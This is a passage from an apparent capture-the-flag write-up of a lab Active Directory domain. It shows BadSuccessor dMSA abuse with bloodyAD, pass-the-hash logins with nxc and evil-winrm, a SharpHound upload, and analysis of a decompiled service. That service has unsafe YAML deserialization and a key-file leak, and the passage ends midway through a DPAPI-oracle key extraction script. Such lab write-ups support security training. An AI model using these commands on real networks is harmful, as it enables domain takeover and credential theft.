bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --attr nTSecurityDescriptor

(OA;;WP;3752e002-43be-48c8-b3ca-2cb2fffbc8a1;;S-1-5-21-4175332977-3571604968-1809176562-7102)(OA;;WP;a0945b2b-57a2-43bd-b327-4d112a4e8bd1;;S-1-5-21-4175332977-3571604968-1809176562-7102)(OA;;WP;a4693096-a4c3-4ecd-b8cb-73cd6398b7a2;;S-1-5-21-4175332977-3571604968-1809176562-7102)

bloodyAD -H $dc -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'S-1-5-21-4175332977-3571604968-1809176562-7102' --attr sAMAccountName
# sAMAccountName: PipelineMigrationOps am on this group 

bloodyAD -H DC01.odyssey.htb -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k get object 'OU=Migrations,DC=odyssey,DC=htb' --attr nTSecurityDescriptor

(OA;;CC;0feb936f-47b3-49f2-9386-1dedc2c23765;;S-1-5-21-4175332977-3571604968-1809176562-7102)

```
{% endcode %}

{% hint style="info" %}
**SVC\_DEPLOY : WRITE ON 2 ATTRIBUTES**&#x20;

**Attribute msDS-SupersededManagedAccountLink**

**Attribute msDS-SupersededServiceAccountState**





**OU migration that contain svc\_deploy  : WRITE ON 1 attributes**

**msDS-DelegatedManagedServiceAccount (**&#x54;he delegated managed service account class is used to create an account which can supersede a legacy service account and can be shared by different computers.**)**
{% endhint %}

**With this attributes we have the BadSuccessor attack**

{% hint style="warning" %}
**BadSuccessor Bug**

\
**All an attacker needed was an OU with CreateChild permissions, which would allow them to create a dMSA account. Once this account is created, an attacker can use specific attributes, namely&#x20;**_**msDS-GroupMSAMembership**_**&#x20;and&#x20;**_**msDS-ManagedAccountPrecededByLink**_**&#x20;on the dMSA account, to impersonate any user (yes, including domain admins) in the domain.**
{% endhint %}

{% hint style="danger" %}
**On August 12**<sup>**th**</sup>**, 2025**

**Credential and privilege acquisition (shadow credentials alternative)**&#x20;

**Today, If an attacker controls a target principal (e.g., has GenericWrite on a user or computer), they can compromise it either by adding a shadow credential, or by performing a targeted Kerberoasting attack.**

[**https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch**](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
{% endhint %}

**So what i understand if i can create a Dmsa and i control it i can add shadow creds**&#x20;

{% code overflow="wrap" %}
```bash
bloodyad -H $dc -d odyssey.htb -u svc-aegis-build --dc-ip 172.16.0.10 -k add badSuccessor gb05_dmsa -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' --ou "OU=Migrations,DC=odyssey,DC=htb"
# 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
```
{% endcode %}

**Attribute msDS-SupersededManagedAccountLink because of this attrbitue we retriev also for the svc deploy hash**&#x20;

{% code overflow="wrap" %}
```bash
nxc smb 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
#  [+] odyssey.htb\svc-aegis-deploy:3a5026b2aa5ef2cbb7cb6a7be3a2bcfa

evil-winrm -i 172.16.0.10 -u "svc-aegis-deploy" -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa
upload /home/gb05/Desktop/CPTS_PREP/ADtools/SharpHound.exe
.\SharpHound.exe -c All -d odyssey.htb
```
{% endcode %}

<mark style="color:blue;">**Step 12**</mark>

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**I think my next target is svc stream because he has DCSync on the domain we need to found how to pivot to him**&#x20;

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**so we can query the DC server,**

**logiccaly since we see svc deploy for the app it can have the source code of the APP that may lead us to something new**

{% code overflow="wrap" %}
```powershell
cd "C:\Program Files\Aegis Stream Collector"
-a----          5/8/2026  12:44 PM          13824 AegisStream.Common.dll
-a----          5/9/2026  12:00 AM          30561 AegisStreamSvc.deps.json
-a----          5/9/2026  12:00 AM          39424 AegisStreamSvc.dll
-a----          5/9/2026  12:00 AM         152064 AegisStreamSvc.exe
-a----          5/8/2026  12:44 PM            440 AegisStreamSvc.runtimeconfig.json
-a----          5/8/2026  12:44 PM          27627 AegisStreamWatchdog.deps.json
-a----          5/8/2026  12:44 PM          13312 AegisStreamWatchdog.dll
-a----          5/8/2026  12:44 PM         152064 AegisStreamWatchdog.exe
-a----          5/8/2026  12:44 PM            328 AegisStreamWatchdog.runtimeconfig.json
-a----          5/8/2026  12:44 PM            137 appsettings.json
-a----          5/8/2026  12:44 PM          27936 Microsoft.Extensions.Configuration.Abstractions.dll
-a----          5/8/2026  12:44 PM          42784 Microsoft.Extensions.Configuration.Binder.dll
-a----          5/8/2026  12:44 PM          24736 Microsoft.Extensions.Configuration.CommandLine.dll
-a----          5/8/2026  12:44 PM          43800 Microsoft.Extensions.Configuration.dll
-a----          5/8/2026  12:44 PM          21280 Microsoft.Extensions.Configuration.EnvironmentVariables.dll
-a----          5/8/2026  12:44 PM          27936 Microsoft.Extensions.Configuration.FileExtensions.dll
-a----          5/8/2026  12:44 PM          26920 Microsoft.Extensions.Configuration.Json.dll
-a----          5/8/2026  12:44 PM          25384 Microsoft.Extensions.Configuration.UserSecrets.dll
-a----          5/8/2026  12:44 PM          63768 Microsoft.Extensions.DependencyInjection.Abstractions.dll
-a----          5/8/2026  12:44 PM          92952 Microsoft.Extensions.DependencyInjection.dll
-a----          5/8/2026  12:44 PM          30480 Microsoft.Extensions.Diagnostics.Abstractions.dll
-a----          5/8/2026  12:44 PM          35592 Microsoft.Extensions.Diagnostics.dll
-a----          5/8/2026  12:44 PM          22176 Microsoft.Extensions.FileProviders.Abstractions.dll
-a----          5/8/2026  12:44 PM          44808 Microsoft.Extensions.FileProviders.Physical.dll
-a----          5/8/2026  12:44 PM          45848 Microsoft.Extensions.FileSystemGlobbing.dll
-a----          5/8/2026  12:44 PM          51472 Microsoft.Extensions.Hosting.Abstractions.dll
-a----          5/8/2026  12:44 PM          72488 Microsoft.Extensions.Hosting.dll
-a----          5/8/2026  12:44 PM          29872 Microsoft.Extensions.Hosting.WindowsServices.dll
-a----          5/8/2026  12:44 PM          65320 Microsoft.Extensions.Logging.Abstractions.dll
-a----          5/8/2026  12:44 PM          27912 Microsoft.Extensions.Logging.Configuration.dll
-a----          5/8/2026  12:44 PM          71464 Microsoft.Extensions.Logging.Console.dll
-a----          5/8/2026  12:44 PM          20248 Microsoft.Extensions.Logging.Debug.dll
-a----          5/8/2026  12:44 PM          50976 Microsoft.Extensions.Logging.dll
-a----          5/8/2026  12:44 PM          25760 Microsoft.Extensions.Logging.EventLog.dll
-a----          5/8/2026  12:44 PM          34568 Microsoft.Extensions.Logging.EventSource.dll
-a----          5/8/2026  12:44 PM          22688 Microsoft.Extensions.Options.ConfigurationExtensions.dll
-a----          5/8/2026  12:44 PM          64776 Microsoft.Extensions.Options.dll
-a----          5/8/2026  12:44 PM          43680 Microsoft.Extensions.Primitives.dll
-a----          5/8/2026  12:44 PM         172704 System.Diagnostics.EventLog.dll
-a----          5/8/2026  12:44 PM         801080 System.Diagnostics.EventLog.Messages.dll
-a----          5/8/2026  12:44 PM          87728 System.ServiceProcess.ServiceController.dll
-a----          5/8/2026   4:09 PM         235520 YamlDotNet.dll
```
{% endcode %}

**we check our permissions in this folder for the app**&#x20;

{% code overflow="wrap" %}
```powershell
 icacls "C:\Program Files\Aegis Stream Collector"
 # BUILTIN\Users:(I)(RX)
```
{% endcode %}

{% code overflow="wrap" %}
```bash
ilspycmd AegisStreamSvc.dll > AegisStreamSvc_decompiled.cs
ilspycmd AegisStreamWatchdog.dll > decompiled.cs
```
{% endcode %}

**After debbging the app here is the critical things i've found**&#x20;

{% hint style="info" %}
1. **Named Pipe Access**: The service `AegisStreamSvc` listens on `\\.\pipe\AegisStreamMgmt`. Your user `svc-aegis-deploy` is a member of `AegisStream-Viewers`, which grants me permission to connect to this pipe.

{% code overflow="wrap" %}
```
private static NamedPipeServerStream CreatePipe()
string[] array = new string[3] { "AegisStream-Viewers", "AegisStream-Auditors", "AegisStream-Operators" };
```
{% endcode %}

**And we are on the Viewers-Group**
{% endhint %}

{% hint style="info" %}
1. **YAML Deserialization (RCE)**: The `CONFIG_IMPORT` command uses `YamlDotNet` with `TypeNameInTagNodeTypeResolver`. This is vulnerable to Unsafe YAML Deserialization. If we can send a malicious YAML payload, we can achieve Remote Code Execution (RCE) in the context of the service.

{% code overflow="wrap" %}
```c
// Dans PipeServerWorker.HandleConfigImport()
private async Task HandleConfigImport(NamedPipeServerStream pipe, Frame frame, CancellationToken ct)
{
    // 1. Le payload YAML est lu depuis le frame
    string s = Encoding.UTF8.GetString(frame.Payload);
    
    // 2. ⭐ CRITICAL VULNERABILITY ⭐
    IDeserializer val = new DeserializerBuilder()
        .WithNodeTypeResolver((INodeTypeResolver)new TypeNameInTagNodeTypeResolver())  // ← DANGER !
        .Build();
    
    // 3. Désérialisation en object générique
    object config = val.Deserialize<object>((TextReader)new StringReader(s));
    
    // 4. Application de la config
    _config.Apply(config);
    await Reply(pipe, frame.ReqId, "OK", null, ct);
}
```
{% endcode %}

**Whats `TypeNameInTagNodeTypeResolver ?`**

**It is a type resolver of YamlDotNet that allows the user to specify the.NET type to be instantiated directly into the YAML via YAML tags**

**Why we have RCE here**

**if we control the YAML input it get deserializing using** `TypeNameInTagNodeTypeResolver`

**then it Instantiate any .NET class loaded in AppDomain then we call a method that edxecute this**&#x20;
{% endhint %}

{% hint style="info" %}
1. **The Catch (Authentication)**: To execute `CONFIG_IMPORT`, we need the **Operator** role. The service authenticates clients by checking an HMAC-SHA256 signature against three keys: `ViewerKey`, `AuditorKey`, and `OperatorKey`.

{% code overflow="wrap" %}
```c
// Dans PipeServerWorker - Table des rôles minimum requis
private static readonly Dictionary<string, Role> MinRoles = new Dictionary<string, Role>(StringComparer.Ordinal)
{
    ["STREAM_LIST"]               = Role.Viewer,    // ← Le moins privilégié
    ["STREAM_GET"]                = Role.Viewer,
    ["STREAM_METRICS"]            = Role.Auditor,
    ["STREAM_REPLAY"]             = Role.Auditor,
    ["DIAG_DECRYPT_TELEMETRY_BLOB"] = Role.Viewer,
    ["CONFIG_EXPORT"]             = Role.Operator,
    ["CONFIG_IMPORT"]             = Role.Operator,  // ← ⭐ NOTRE CIBLE ⭐
    ["MAINT_RELOAD"]              = Role.Operator
};


// Auth process
private Role InferRoleFromSignature(Frame frame)
{
    byte[] data = frame.BodyForSignature();
    
    // Teste chaque clé dans l'ordre : Operator > Auditor > Viewer
    (Role, byte[])[] array = new(Role, byte[])[3]
    {
        (Role.Operator, _keys.OperatorKey),   // ← Priorité 1
        (Role.Auditor, _keys.AuditorKey),     // ← Priorité 2
        (Role.Viewer, _keys.ViewerKey)        // ← Priorité 3
    };
    
    for (int i = 0; i < array.Length; i++)
    {
        (Role, byte[]) tuple = array[i];
        Role item = tuple.Item1;
        byte[] item2 = tuple.Item2;
        
        // Calcule HMAC-SHA256(clé, données)
        byte[] a = HmacUtil.ComputeHmacSha256(item2, data);
        
        // Compare en temps constant (anti timing attack)
        if (HmacUtil.ConstantTimeEquals(a, frame.Signature))
        {
            return item;  // ← Rôle attribué si la signature correspond
        }
    }
    return Role.None;  // ← Aucune clé ne matche
}
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
1. **Key are leaked we have they're location**

{% code overflow="wrap" %}
```c
// Dans KeyStore.LoadOrBootstrap()
public void LoadOrBootstrap()
{
    EnsureDataDirs();  // ← Crée les dossiers
    
    // ⭐ ÉTAPE 1 : GÉNÉRATION EN CLAIRE ⭐
    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\viewer.key"))
    {
        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
    }
    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\auditor.key"))
    {
        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
    }
    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key"))
    {
        GenerateAndWriteCleartext("C:\\ProgramData\\AegisStream\\keys\\operator.key");
    }
    
    // ⭐ ÉTAPE 2 : CHIFFREMENT DE L'OPÉRATEUR ⭐
    if (!File.Exists("C:\\ProgramData\\AegisStream\\keys\\operator.key.enc") || 
        !File.Exists("C:\\ProgramData\\AegisStream\\dpapi\\operator.wrap.bin"))
    {
        BootstrapOperatorEncryption();  // ← Chiffre operator.key
    }
    
    // ⭐ ÉTAPE 3 : CHARGEMENT EN MÉMOIRE ⭐
    _viewerKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\viewer.key");
    _auditorKey = File.ReadAllBytes("C:\\ProgramData\\AegisStream\\keys\\auditor.key");
    _operatorKey = LoadOperatorKeyEncrypted();  // ← Via DPAPI
}
```
{% endcode %}
{% endhint %}

**Attack chain :**&#x20;

### <mark style="color:red;">PHASE 1 : Oracle DPAPI - Récupérer la KEK</mark>

{% hint style="info" %}
**Entrée : operator.wrap.bin (chiffré par DPAPI)**&#x20;

**Oracle : DIAG\_DECRYPT\_TELEMETRY\_BLOB (via le pipe)**&#x20;

**Sortie : KEK en clair (la clé AES)**

**F**

**But since the svc stream can decypt, the service also exposed  this function `DIAG_DECRYPT_TELEMETRY_BLOBb` it do the same**
{% endhint %}

{% code overflow="wrap" %}
```powershell
# Lire viewer.key (nécessaire pour signer nos requêtes)
$viewerKey = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\keys\viewer.key')
$viewerKeyHex = [BitConverter]::ToString($viewerKey) -replace '-', ''
Write-Host "VIEWER_KEY: $viewerKeyHex"

# Lire operator.wrap.bin (ce qu'on va envoyer à l'oracle)
$wrapBlob = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\dpapi\operator.wrap.bin')
$wrapBlobHex = [BitConverter]::ToString($wrapBlob) -replace '-', ''
Write-Host "WRAP_BLOB: $wrapBlobHex"

# Lire operator.key.enc (ce qu'on décryptera plus tard)
$encBlob = [IO.File]::ReadAllBytes('C:\ProgramData\AegisStream\keys\operator.key.enc')
$encBlobB64 = [Convert]::ToBase64String($encBlob)
Write-Host "ENC_BLOB_B64: $encBlobB64"

VIEWER_KEY: 6204420823D72023C616D14BC0A5DFA35F549788B1ED8A970B92CF1991AC8FA6
WRAP_BLOB: 01000000D08C9DDF0115D1118C7A00C04FC297EB010000007506668C60F21F48B4941EAACA7C023F000000000200000000001066000000010000200000004FF39E66CD74FC52BC9CDE8B6A48024A938184829D124F05891765D64BA77396000000000E8000000002000020000000356BA0F19F812C47EDBB533A37A91F8954C02BDD21721EBE59F02F41444CE02330000000D4F060875B0A2AFC8F70F2114477BD185681E9E2975C8E6ACE3C1D1115886EE59A6113A159067482128AAFAFC7BAC8C44000000035C411553CB55993BC0E86C808B9BCD1963D1C1F3151B823AA53FEAF7F2E626C86D660B0C3C35298A31FE2D255A1745C52F1C14DCE20F34BAAAABDF50CCF0645
ENC_BLOB_B64: 1TZcBcBcDvenMAy7WxkiJ/+MVOcAT1ri6P8T8WW1nBPuBv7YGBqHBdUu+xZpzbqRG4kCehfmy2bG70to
```
{% endcode %}

<br>
